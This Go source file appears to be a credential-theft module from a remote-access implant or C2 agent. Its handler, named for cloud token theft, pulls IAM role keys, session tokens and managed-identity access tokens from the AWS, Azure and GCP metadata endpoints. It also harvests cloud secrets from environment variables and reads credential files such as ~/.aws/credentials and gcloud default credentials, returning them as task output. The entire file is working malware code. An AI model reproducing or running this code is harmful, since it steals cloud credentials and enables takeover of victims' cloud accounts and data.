//go:build linux || windows || darwin

package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// CloudTokenResult holds discovered cloud credentials
type CloudTokenResult struct {
	Provider   string            `json:"provider"`
	AccountID  string            `json:"account_id,omitempty"`
	Region     string            `json:"region,omitempty"`
	InstanceID string            `json:"instance_id,omitempty"`
	Tokens     []CloudToken      `json:"tokens,omitempty"`
	RoleNames  []string          `json:"role_names,omitempty"`
	Metadata   map[string]string `json:"metadata,omitempty"`
	Error      string            `json:"error,omitempty"`
}

type CloudToken struct {
	Type      string `json:"type"`     // access_key, secret_key, token, cert
	Resource  string `json:"resource"` // which cloud resource this belongs to
	Value     string `json:"value,omitempty"`
	ExpiresIn int    `json:"expires_in,omitempty"`
}

func handleCloudTokenTheftImpl(task Task, res *TaskResult) {
	provider := task.Command // "aws", "azure", "gcp", or "all" (default)
	if provider == "" {
		provider = "all"
	}

	// First detect cloud environment
	detected := detectCloudProvider()
	envProvider := detected.Provider

	var results []CloudTokenResult

	client := &http.Client{Timeout: 3 * time.Second}

	switch provider {
	case "aws":
		if r := checkAWS(client); r != nil {
			results = append(results, *r)
		}
	case "azure":
		if r := checkAzure(client); r != nil {
			results = append(results, *r)
		}
	case "gcp":
		if r := checkGCP(client); r != nil {
			results = append(results, *r)
		}
	case "all":
		// Run all providers based on detection or try all
		if envProvider != "unknown" && envProvider != "AWS" && envProvider != "Azure" && envProvider != "GCP" {
			// Unknown cloud - try all
			if r := checkAWS(client); r != nil {
				results = append(results, *r)
			}
			if r := checkAzure(client); r != nil {
				results = append(results, *r)
			}
			if r := checkGCP(client); r != nil {
				results = append(results, *r)
			}
		} else {
			// Run only detected provider first
			switch envProvider {
			case "AWS":
				if r := checkAWS(client); r != nil {
					results = append(results, *r)
				}
			case "Azure":
				if r := checkAzure(client); r != nil {
					results = append(results, *r)
				}
			case "GCP":
				if r := checkGCP(client); r != nil {
					results = append(results, *r)
				}
			default:
				// Try all
				if r := checkAWS(client); r != nil {
					results = append(results, *r)
				}
				if r := checkAzure(client); r != nil {
					results = append(results, *r)
				}
				if r := checkGCP(client); r != nil {
					results = append(results, *r)
				}
			}
		}
	}

	// Always check env vars and config files (cross-provider)
	if r := checkCloudEnvVars(); r != nil {
		results = append(results, *r)
	}
	if r := checkCloudConfigFiles(); r != nil {
		results = append(results, *r)
	}

	// Build output
	var sb strings.Builder

	// Write detection info
	if envProvider != "unknown" {
		sb.WriteString(fmt.Sprintf("=== Cloud Environment Detected: %s ===\n", detected.String()))
	}

	for _, r := range results {
		sb.WriteString(fmt.Sprintf("=== %s ===\n", r.Provider))
		if r.Error != "" {
			sb.WriteString(fmt.Sprintf("  Error: %s\n", r.Error))
			continue
		}
		if r.AccountID != "" {
			sb.WriteString(fmt.Sprintf("  Account: %s\n", r.AccountID))
		}
		if r.Region != "" {
			sb.WriteString(fmt.Sprintf("  Region: %s\n", r.Region))
		}
		if r.InstanceID != "" {
			sb.WriteString(fmt.Sprintf("  Instance: %s\n", r.InstanceID))
		}
		for _, t := range r.Tokens {
			val := t.Value
			if len(val) > 60 {
				val = val[:30] + "..." + val[len(val)-30:]
			}
			sb.WriteString(fmt.Sprintf("  Token[%s]@%s: %s\n", t.Type, t.Resource, val))
		}
		for _, role := range r.RoleNames {
			sb.WriteString(fmt.Sprintf("  Role: %s\n", role))
		}
		for k, v := range r.Metadata {
			if len(v) > 120 {
				v = v[:60] + "..." + v[len(v)-60:]
			}
			sb.WriteString(fmt.Sprintf("  %s: %s\n", k, v))
		}
	}

	res.Output = sb.String()

	// Store structured data for credential parsing
	if len(results) > 0 {
		jsonData, _ := json.Marshal(results)
		res.Encoding = "credential"
		res.Output = string(jsonData)
	}
}

func checkAWS(client *http.Client) *CloudTokenResult {
	r := &CloudTokenResult{Provider: "AWS"}

	// Check AWS IMDS reachability
	token := getIMDSToken(client)
	if token == "" {
		// Try IMDSv1
		resp, err := client.Get("http://169.254.169.254/latest/meta-data/")
		if err != nil {
			r.Error = "AWS IMDS not reachable"
			return r
		}
		resp.Body.Close()
		if resp.StatusCode != 200 {
			r.Error = "AWS IMDS not reachable"
			return r
		}
		// Use IMDSv1
		r.Metadata = make(map[string]string)
		fetchAWSMetadataV1(client, r)
		if len(r.RoleNames) > 0 {
			checkAWSAll(client, r)
		}
		return r
	}

	r.Metadata = make(map[string]string)

	// Fetch basic metadata
	items := map[string]string{
		"instance-id":                 "instance-id",
		"placement/region":            "region",
		"placement/availability-zone": "az",
		"ami-id":                      "ami",
		"hostname":                    "hostname",
		"iam/info":                    "iam_info",
	}
	for path, key := range items {
		req, _ := http.NewRequest("GET",
			fmt.Sprintf("http://169.254.169.254/latest/meta-data/%s", path), nil)
		req.Header.Set("X-aws-ec2-metadata-token", token)
		if resp, err := client.Do(req); err == nil {
			body, _ := io.ReadAll(resp.Body)
			r.Metadata[key] = strings.TrimSpace(string(body))
			resp.Body.Close()
		}
	}

	// Extract region and instance ID
	if region, ok := r.Metadata["region"]; ok {
		r.Region = region
	}
	if instID, ok := r.Metadata["instance-id"]; ok {
		r.InstanceID = instID
	}

	// Get IAM role and credentials
	roleReq, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", nil)
	roleReq.Header.Set("X-aws-ec2-metadata-token", token)
	if roleResp, err := client.Do(roleReq); err == nil {
		body, _ := io.ReadAll(roleResp.Body)
		roleResp.Body.Close()
		if roleResp.StatusCode == 200 {
			roleName := strings.TrimSpace(string(body))
			if roleName != "" {
				r.RoleNames = append(r.RoleNames, roleName)

				credReq, _ := http.NewRequest("GET",
					fmt.Sprintf("http://169.254.169.254/latest/meta-data/iam/security-credentials/%s", roleName), nil)
				credReq.Header.Set("X-aws-ec2-metadata-token", token)
				if credResp, err := client.Do(credReq); err == nil {
					defer credResp.Body.Close()
					credBody, _ := io.ReadAll(credResp.Body)
					var credData map[string]interface{}
					if json.Unmarshal(credBody, &credData) == nil {
						if ak, ok := credData["AccessKeyId"].(string); ok {
							r.Tokens = append(r.Tokens, CloudToken{Type: "aws_access_key", Resource: roleName, Value: ak})
						}
						if sk, ok := credData["SecretAccessKey"].(string); ok {
							r.Tokens = append(r.Tokens, CloudToken{Type: "aws_secret_key", Resource: roleName, Value: sk})
						}
						if tok, ok := credData["Token"].(string); ok {
							r.Tokens = append(r.Tokens, CloudToken{Type: "aws_session_token", Resource: roleName, Value: tok})
						}
					}
				}
			}
		}
	}

	// AWS deep checks (SSM, Secrets Manager, Lambda, etc.)
	checkAWSAll(client, r)

	return r
}

func fetchAWSMetadataV1(client *http.Client, r *CloudTokenResult) {
	items := map[string]string{
		"instance-id":                 "instance-id",
		"placement/region":            "region",
		"placement/availability-zone": "az",
		"iam/info":                    "iam_info",
	}
	for path, key := range items {
		resp, err := client.Get(fmt.Sprintf("http://169.254.169.254/latest/meta-data/%s", path))
		if err == nil {
			body, _ := io.ReadAll(resp.Body)
			r.Metadata[key] = strings.TrimSpace(string(body))
			resp.Body.Close()
		}
	}

	// Extract region and instance ID
	if region, ok := r.Metadata["region"]; ok {
		r.Region = region
	}
	if instID, ok := r.Metadata["instance-id"]; ok {
		r.InstanceID = instID
	}

	// IAM role
	resp, err := client.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
	if err == nil {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		roleName := strings.TrimSpace(string(body))
		if roleName != "" {
			r.RoleNames = append(r.RoleNames, roleName)

			credResp, err := client.Get(
				fmt.Sprintf("http://169.254.169.254/latest/meta-data/iam/security-credentials/%s", roleName))
			if err == nil {
				defer credResp.Body.Close()
				credBody, _ := io.ReadAll(credResp.Body)
				var credData map[string]interface{}
				if json.Unmarshal(credBody, &credData) == nil {
					if ak, ok := credData["AccessKeyId"].(string); ok {
						r.Tokens = append(r.Tokens, CloudToken{Type: "aws_access_key", Resource: roleName, Value: ak})
					}
					if sk, ok := credData["SecretAccessKey"].(string); ok {
						r.Tokens = append(r.Tokens, CloudToken{Type: "aws_secret_key", Resource: roleName, Value: sk})
					}
					if tok, ok := credData["Token"].(string); ok {
						r.Tokens = append(r.Tokens, CloudToken{Type: "aws_session_token", Resource: roleName, Value: tok})
					}
				}
			}
		}
	}

	// AWS deep checks with V1
	checkAWSAll(client, r)
}

func checkAzure(client *http.Client) *CloudTokenResult {
	r := &CloudTokenResult{Provider: "Azure"}

	req, _ := http.NewRequest("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", nil)
	req.Header.Set("Metadata", "true")

	resp, err := client.Do(req)
	if err != nil {
		r.Error = fmt.Sprintf("Azure IMDS not reachable: %v", err)
		return r
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		r.Error = fmt.Sprintf("Azure IMDS returned %d", resp.StatusCode)
		return r
	}

	body, _ := io.ReadAll(resp.Body)
	var instanceMeta map[string]interface{}
	if err := json.Unmarshal(body, &instanceMeta); err != nil {
		r.Error = fmt.Sprintf("parse error: %v", err)
		return r
	}

	r.Metadata = make(map[string]string)
	r.Metadata["raw"] = string(body)

	if compute, ok := instanceMeta["compute"].(map[string]interface{}); ok {
		if id, ok := compute["subscriptionId"].(string); ok {
			r.AccountID = id
		}
		if loc, ok := compute["location"].(string); ok {
			r.Region = loc
		}
		if vmID, ok := compute["vmId"].(string); ok {
			r.InstanceID = vmID
		}
		if name, ok := compute["name"].(string); ok {
			r.Metadata["vm_name"] = name
		}
		if osType, ok := compute["osType"].(string); ok {
			r.Metadata["os"] = osType
		}
		if tenant, ok := compute["tenantId"].(string); ok {
			r.Metadata["tenant_id"] = tenant
		}
	}

	// Managed identity token
	tokenReq, _ := http.NewRequest("GET",
		"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com",
		nil)
	tokenReq.Header.Set("Metadata", "true")
	tokenResp, err := client.Do(tokenReq)
	if err == nil && tokenResp.StatusCode == 200 {
		defer tokenResp.Body.Close()
		tokenBody, _ := io.ReadAll(tokenResp.Body)
		var tokenData map[string]interface{}
		if json.Unmarshal(tokenBody, &tokenData) == nil {
			if accessToken, ok := tokenData["access_token"].(string); ok {
				r.Tokens = append(r.Tokens, CloudToken{
					Type:     "azure_access_token",
					Resource: "management.azure.com",
					Value:    accessToken,
				})
			}
		}
	}

	// Azure deep checks (Key Vault, ARM, Automation, etc.)
	checkAzureAll(client, r)

	return r
}

func checkGCP(client *http.Client) *CloudTokenResult {
	r := &CloudTokenResult{Provider: "GCP"}

	req, _ := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", nil)
	req.Header.Set("Metadata-Flavor", "Google")

	resp, err := client.Do(req)
	if err != nil {
		r.Error = fmt.Sprintf("GCP metadata not reachable: %v", err)
		return r
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		r.Error = fmt.Sprintf("GCP metadata returned %d", resp.StatusCode)
		return r
	}

	body, _ := io.ReadAll(resp.Body)
	accounts := strings.Fields(strings.ReplaceAll(string(body), "\n", " "))

	r.Metadata = make(map[string]string)
	r.Metadata["service_accounts"] = strings.Join(accounts, ", ")

	// Fetch default account info
	defaultReq, _ := http.NewRequest("GET",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/", nil)
	defaultReq.Header.Set("Metadata-Flavor", "Google")
	if defResp, err := client.Do(defaultReq); err == nil {
		defBody, _ := io.ReadAll(defResp.Body)
		r.Metadata["default_info"] = strings.TrimSpace(string(defBody))
		defResp.Body.Close()
	}

	// Fetch access token for default account
	tokenReq, _ := http.NewRequest("GET",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", nil)
	tokenReq.Header.Set("Metadata-Flavor", "Google")
	if tokenResp, err := client.Do(tokenReq); err == nil {
		defer tokenResp.Body.Close()
		tokenBody, _ := io.ReadAll(tokenResp.Body)
		var tokenData map[string]interface{}
		if json.Unmarshal(tokenBody, &tokenData) == nil {
			if accessToken, ok := tokenData["access_token"].(string); ok {
				r.Tokens = append(r.Tokens, CloudToken{
					Type:     "gcp_access_token",
					Resource: "default",
					Value:    accessToken,
				})
			}
		}
	}

	// GCP deep checks (KMS, Secret Manager, Cloud Functions, etc.)
	checkGCPAll(client, r)

	return r
}

func checkCloudEnvVars() *CloudTokenResult {
	r := &CloudTokenResult{Provider: "Environment Variables"}
	r.Tokens = []CloudToken{}

	// AWS
	if ak := os.Getenv("AWS_ACCESS_KEY_ID"); ak != "" {
		r.Tokens = append(r.Tokens, CloudToken{Type: "aws_access_key", Resource: "env", Value: ak})
	}
	if sk := os.Getenv("AWS_SECRET_ACCESS_KEY"); sk != "" {
		r.Tokens = append(r.Tokens, CloudToken{Type: "aws_secret_key", Resource: "env", Value: sk})
	}
	if st := os.Getenv("AWS_SESSION_TOKEN"); st != "" {
		r.Tokens = append(r.Tokens, CloudToken{Type: "aws_session_token", Resource: "env", Value: st})
	}

	// Azure
	if azSub := os.Getenv("AZURE_SUBSCRIPTION_ID"); azSub != "" {
		if r.Metadata == nil {
			r.Metadata = make(map[string]string)
		}
		r.Metadata["az_subscription"] = azSub
	}
	if azTenant := os.Getenv("AZURE_TENANT_ID"); azTenant != "" {
		if r.Metadata == nil {
			r.Metadata = make(map[string]string)
		}
		r.Metadata["az_tenant"] = azTenant
	}
	if azClient := os.Getenv("AZURE_CLIENT_ID"); azClient != "" {
		if r.Metadata == nil {
			r.Metadata = make(map[string]string)
		}
		r.Metadata["az_client"] = azClient
	}
	if azSecret := os.Getenv("AZURE_CLIENT_SECRET"); azSecret != "" {
		r.Tokens = append(r.Tokens, CloudToken{Type: "azure_client_secret", Resource: "env", Value: azSecret})
	}

	// GCP
	if gcpCreds := os.Getenv("GOOGLE_APPLICATION_CREDENTIALS"); gcpCreds != "" {
		if r.Metadata == nil {
			r.Metadata = make(map[string]string)
		}
		r.Metadata["gcp_creds_file"] = gcpCreds
		if data, err := os.ReadFile(gcpCreds); err == nil {
			r.Tokens = append(r.Tokens, CloudToken{Type: "gcp_service_account_json", Resource: "env", Value: string(data)})
		}
	}

	return r
}

func checkCloudConfigFiles() *CloudTokenResult {
	r := &CloudTokenResult{Provider: "Config Files"}
	r.Tokens = []CloudToken{}

	homeDir, err := os.UserHomeDir()
	if err != nil || homeDir == "" {
		homeDir = os.Getenv("USERPROFILE")
	}
	if homeDir == "" {
		homeDir = os.Getenv("HOME")
	}
	if homeDir == "" {
		return r
	}

	try := func(rel string, tokType, resource string) {
		data, err := os.ReadFile(filepath.Join(append([]string{homeDir}, strings.Split(rel, "/")...)...))
		if err == nil {
			r.Tokens = append(r.Tokens, CloudToken{Type: tokType, Resource: resource, Value: string(data)})
		}
	}
	try(".aws/credentials", "aws_credentials_file", "~/.aws/credentials")
	try(".aws/config", "aws_config_file", "~/.aws/config")
	try(".azure/azureProfile.json", "azure_profile", "~/.azure/azureProfile.json")
	try(".azure/accessTokens.json", "azure_tokens", "~/.azure/accessTokens.json")
	try(".azure/servicePrincipal.json", "azure_sp_json", "~/.azure/servicePrincipal.json")
	try(".config/gcloud/application_default_credentials.json", "gcp_adc", "~/.config/gcloud/application_default_credentials.json")
	try(".config/gcloud/legacy_credentials/default/adc.json", "gcp_legacy_adc", "~/.config/gcloud/legacy_credentials/default/adc.json")
	try(".config/gcloud/credentials.db", "gcp_cred_db", "~/.config/gcloud/credentials.db")

	return r
}
